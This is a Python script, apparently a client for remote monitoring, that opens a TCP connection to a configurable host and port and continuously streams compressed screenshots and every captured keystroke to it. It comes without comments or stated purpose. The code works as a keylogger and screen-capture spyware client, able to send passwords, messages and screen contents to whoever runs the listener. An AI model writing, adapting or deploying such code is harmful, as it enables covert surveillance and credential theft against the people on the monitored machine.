import socket
from threading import Thread
from zlib import compress
from mss import mss
from pynput import keyboard

WIDTH = 1900
HEIGHT = 1000
conn = None  # Global connection variable

def retrieve_screenshot():
    global conn
    with mss() as sct:
        rect = {'top': 0, 'left': 0, 'width': WIDTH, 'height': HEIGHT}
        try:
            while True:
                img = sct.grab(rect)
                pixels = compress(img.rgb, 6)
                size = len(pixels)
                size_len = (size.bit_length() + 7) // 8
                conn.send(b"S" + bytes([size_len]))
                size_bytes = size.to_bytes(size_len, 'big')

                conn.send(size_bytes)
                conn.sendall(pixels)
        except Exception as e:
            print(f"Error in retrieve_screenshot: {e}")

def start_keyboard_listener():
    with keyboard.Listener(on_press=on_key_press) as keyboard_listener:
        keyboard_listener.join()

def on_key_press(key):
    try:
        key_char = key.char
    except AttributeError:
        # Handle special keys
        key_char = str(key)
        if key == key.space:
            key_char = " "

    send_keyboard_input(key_char)


def send_keyboard_input(key_char):
    global conn
    size = len(key_char)
    size_len = (size.bit_length() + 7) // 8
    conn.send(b"K" + bytes([size_len]))
    size_bytes = size.to_bytes(size_len, 'big')

    conn.send(size_bytes)
    conn.sendall(key_char.encode())

def main(host='127.0.0.1', port=5000):
    global conn
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    try:
        conn = sock
        screenshot_thread = Thread(target=retrieve_screenshot)
        keyboard_thread = Thread(target=start_keyboard_listener)

        screenshot_thread.start()
        keyboard_thread.start()

        screenshot_thread.join()
        keyboard_thread.join()

    finally:
        sock.close()

if __name__ == '__main__':
    main()
